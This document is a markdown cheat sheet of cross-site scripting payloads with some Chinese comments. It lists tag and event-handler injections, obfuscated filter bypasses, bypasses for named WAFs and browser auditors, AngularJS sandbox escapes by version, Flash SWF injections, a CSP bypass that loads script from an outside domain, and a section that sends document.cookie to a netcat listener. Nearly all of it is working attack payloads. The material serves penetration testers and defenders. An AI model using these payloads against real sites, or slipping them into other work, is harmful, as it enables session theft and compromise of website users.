# payload

---

## test

```js
<table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>test</h1></td></tr></tbody></table>
```

## basic

```html
<script>
<script>alert(123)</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>+alert(1)</script>
<script>setTimeout(alert(1),0)</script>
<script src=data:text/javascript,alert(1)></script>
<script>alert(String.fromCharCode(49,49))</script>
<<SCRIPT>alert("XSS");
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<script///////////////////////////////////////////////>alert(123)</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
--><script>alert(123)</script>
><script>alert(123);</script x=
<script>alert/(a/)</script>
<script NAUGHTY_HACKER>alert(1)</script NAUGHTY_HACKER>
%3cscript%3ealert("XSS");%3c/script%3e
&ltscript&gtalert(document.cookie);</script>

//绕过进行一次移除操作:
<scr<script>ipt>alert("XSS")</scr<script>ipt>

//Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本:
<script>alert("XSS")</script>
<script src="http://attacker.org/malicious.js"></script>
```

```html
<img>
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(123) />
'"><iMg SrC=x OnErRoR=alert(1)>{{7*7}}

<input>
<input onfocus="alert('xss');">
<input onblur=alert("xss") autofocus><input autofocus> //竞争焦点,从而触发onblur事件
<input onfocus="alert('xss');" autofocus>  //通过autofocus属性执行本身的focus事件,这个向量是使焦点自动跳到输入元素上,触发焦点事件,无需用户去触发
<input type="image" formaction=JaVaScript:alert(0)>

<details>
<details open OntogGle="alert(1)">  //使用open属性触发ontoggle事件,无需用户去触发

<svg>
<svg onload=alert("xss");>
<svg><script>alert(123)</script>
<svg/onload=prompt(1);>
<svg><script>alert&#114;&1#29;</script>
<svg><script>123<1>alert(123)</script>

<select>
<select onfocus=alert(1)></select>
<select onfocus=alert(1) autofocus> //通过autofocus属性执行本身的focus事件

<iframe>
<iframe onload=alert("xss");></iframe>
<IFRAME SRC="javascript:alert(29);"></IFRAME>

<video>
<video><source onerror="alert(1)">
<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
<video onkeyup=setTimeout`al\x65rt\x28/1/\x29```>
<video onkeydown=setTimeout`al\x65rt\x28/1/\x29```>

<audio>
<audio src=x onerror=alert("xss");>

<body>

<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>    //利用换行符以及autofocus,自动去触发onscroll事件,无需用户去触发
<body onload=prompt(1);>

<textarea>
<textarea onfocus=alert("xss"); autofocus>

<keygen>
<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee>
<marquee onstart=alert(1)>hack the planet</marquee>  //Chrome不行,火狐和IE都可以
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<marquee loop="1" onfinish=alert(1)>hack the planet</marquee>
<marquee/onstart=confirm(2)>/

<isindex>
<isindex type=image src=1 onerror=alert("xss")>   //仅限于IE

<anytag>
<anytag onmouseover=alert(1)>M
<anytag onclick=alert(1)>M

<a>
<a onmouseover=alert(1)>M
<a onclick=alert(1)>M
<a href=javascript:alert(1)>M
<a href=javasc&#114;ipt:%61%6c%65%72%74%28%31%29>M
<a href="javascript:alert('test')">link</a>

<div>
<div onclick="alert('xss')">
<div onmouseenter="alert('xss')">   //当用户鼠标移动到 div 上时就会触发我们的代码.
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

<style>
<style onload=alert(1) />

<form>
<form/action=javascript:alert(22)><input/type=submit>
<form onsubmit=alert(23)><button>M

<object>
<object data="javascript:alert(document.domain)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">

<embed>
<embed/src=javascript:alert(29);>
```


```html
利用link远程包含js文件
PS:在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">


javascript伪协议
<a>标签
<a href="javascript:alert(`xss`);">xss</a>

<iframe>标签
<iframe src=javascript:alert('xss');></iframe>

<img>标签
<img src=javascript:alert('xss')>//IE7以下

<form>标签
<form action="Javascript:alert(1)"><input type=submit>


其它
expression属性
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background属性
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

杂项
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
<math><a xlink:href="//baidu.com">click
```

## bypass basic

```js
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>

<script>ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")(1)</script>

<script>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</script>

𒁰='',𒀰=!𒁰+𒁰,𒁃=!𒀰+𒁰,𒅋=𒁰+{},𒄦=𒀰[𒁰++],𒄡=𒀰[𒃺=𒁰],𒂞=++𒃺+𒁰,𒆟=𒅋[𒃺+𒂞],𒀰[𒆟+=𒅋[𒁰]+(𒀰.𒁃+𒅋)[𒁰]+𒁃[𒂞]+𒄦+𒄡+𒀰[𒃺]+𒆟+𒄦+𒅋[𒁰]+𒄡][𒆟](𒁃[𒁰]+𒁃[𒃺]+𒀰[𒂞]+𒄡+𒄦+"`𒁃𒅋𒃺𒂞`")``

Function("alert`𒁃𒅋𒃺𒂞`")``

<svg onwheel=top[11189117..toString(32)](1);>

¼script¾alert(¢XSS¢)¼/script¾

<portal id="q" src="bing.com" onload="print(q.activate())"></portal>

<script>onerror=alert;throw 1337</script>

Code:
<a href="<?=strip_tags($_GET['url']);?>">

PoC:
?url="onm<>ouseover="ale<>rt(1)
```

## Bypass WAF

**Chrome XSS-Auditor Bypass** by [@vivekchsm](https://twitter.com/vivekchsm)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

**Chrome < v60 beta XSS-Auditor Bypass**

```html
<script src="data:,alert(1)%250A-->
```

**Other Chrome XSS-Auditor Bypasses**

```html
<script>alert(1)</script
```

```html
<script>alert(1)%0d%0a-->%09</script
```

```html
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)

```html
<script>location.href;'javascript:alert%281%29'</script>
```

**XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)

```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
```

```html
<img/src=q onerror='new Function`al\ert\`1\``'>
```

## jQuery < 3.0.0 XSS
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
2) Find any requests to trusted API endpoints where script can be injected into data sources.

## URL verification bypasses (works without `&#x09;` too)

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

## Markdown XSS

```md
[a](javascript:confirm(1))
```

```md
[a](javascript://www.google.com%0Aprompt(1))
```

```md
[a](javascript://%0d%0aconfirm(1))
```

```md
[a](javascript://%0d%0aconfirm(1);com)
```

```md
[a](javascript:window.onerror=confirm;throw%201)
```

```md
[a]: (javascript:prompt(1))
```

```md
[a]:(javascript:alert(1))           //Add SOH Character
```

## Flash SWF XSS

- ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`

- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`

- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)

- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>

- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`

- YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`

- YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`

- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`

- AutoDemo: `control.swf?onend=javascript:alert(1)//`

- Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`

- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`

- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`

- SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`

- Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`

- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`

_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._

**Lightweight Markup Languages**

**RubyDoc** (.rdoc)

```rdoc
XSS[JavaScript:alert(1)]
```

**Textile** ([.textile](https://txstyle.org/))

```textile
"Test link":javascript:alert(1)
```

**reStructuredText** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))

```rst
`Test link`__.

__ javascript:alert(document.domain)
```

## Unicode characters

```html
†‡•＜img src=a onerror=javascript:alert('test')>…‰€
```

## AngularJS Template Injection based XSS

*For manual verification on a live target, use `angular.version` in your browser console*

**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}

```

**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

## Content Security Policy (CSP) bypass via JSONP endpoints

Grab the target's CSP:

```
curl -I http://example.com | grep 'Content-Security-Policy'
```

Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.

![](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)

Now we can use a Google dork to find some JSONP endpoints on the domains listed above.

```
site:example.com inurl:callback
```

## CSP BYPASS

```
<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
```

## POLYGLOT

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

## HYPERLINK TAG INJECTION

```
javascript:alert(1)

javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")

javascript://%250Aalert(document.cookie)

javascripT://https://google.com%0aalert(1);//https://google.com

/x:1/:///%01javascript:alert(document.cookie)/


INLINE HTML INJECTION WITHOUT TAG BREAK:

" onclick=alert(1)//">click

" autofocus onfocus=alert(1) "

" onfocus=prompt(1) autofocus fragment="

" onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
```

## JAVASCRIPT INJECTION

```
'?prompt`1`?'

"])},alert(1));(function xss() {//

""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y

"}]}';alert(1);{{'

11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'1

\');confirm(1);//

x");$=alert, $(1);//

'|alert(1)|'

'*prompt(1)*'

"; ||confirm('XSS') || "

"-alert(1)-"

\'-alert(1)};{//

"'-alert(1)-'"

\u0027-confirm`1`-\u0027

'}};alert(1);{{'
```

## send cookie

```
nc -lvp 9001
```

```
<script>
fetch(‘http://127.0.0.1:9001', {
method: ‘POST’,
mode: ‘no-cors’,
body:document.cookie
});
</script>
```
